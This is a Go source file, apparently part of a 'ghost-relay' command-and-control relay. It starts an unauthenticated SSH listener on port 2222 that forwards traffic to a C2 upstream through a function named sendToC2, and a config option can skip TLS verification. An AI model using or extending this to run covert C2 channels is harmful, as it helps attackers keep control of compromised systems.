package main

import (
	"context"
	"crypto/rand"
	"crypto/rsa"
	"crypto/x509"
	"encoding/pem"
	"fmt"

	"ghost-relay/internal/accept"

	"golang.org/x/crypto/ssh"
)

// setupShadeHandler starts the SSH handler on port 2222
func setupShadeHandler(ctx context.Context) {
	shadeConfig := &accept.HandlerConfig{
		UpstreamURL:      cfg.UpstreamBaseURL.String(),
		Timeout:          int(cfg.ClientTimeout.Seconds()),
		InsecureTLS:      cfg.InsecureSkipVerify,
		RequestReadLimit: cfg.RequestReadLimit,
		AgentType:        "any",
	}

	// Generate ephemeral SSH host key
	hostKey, err := generateSSHHostKey()
	if err != nil {
		logger.Printf("Failed to generate SSH host key: %v", err)
		return
	}

	// Create SSH server config
	sshConfig := &ssh.ServerConfig{
		// No password authentication needed - we authenticate via HMAC in the forwarded requests
		NoClientAuth: true,
	}
	sshConfig.AddHostKey(hostKey)

	sshHandler := accept.NewSSHHandler(sendToC2, logger, shadeConfig, sshConfig)

	bindAddr := fmt.Sprintf("%s:2222", cfg.ListenAddr)
	go func() {
		if err := sshHandler.Start(ctx, bindAddr); err != nil {
			logger.Printf("Shade SSH handler error: %v", err)
		}
	}()

	// Register handler for proper shutdown
	handlers = append(handlers, sshHandler)

	logger.Printf("[+] SSH handler on %s", bindAddr)
}

// generateSSHHostKey generates an ephemeral RSA host key for SSH server
func generateSSHHostKey() (ssh.Signer, error) {
	// Generate RSA key
	privateKey, err := rsa.GenerateKey(rand.Reader, 2048)
	if err != nil {
		return nil, err
	}

	// Encode to PEM
	privateKeyPEM := pem.EncodeToMemory(&pem.Block{
		Type:  "RSA PRIVATE KEY",
		Bytes: x509.MarshalPKCS1PrivateKey(privateKey),
	})

	// Parse to SSH signer
	signer, err := ssh.ParsePrivateKey(privateKeyPEM)
	if err != nil {
		return nil, err
	}

	return signer, nil
}
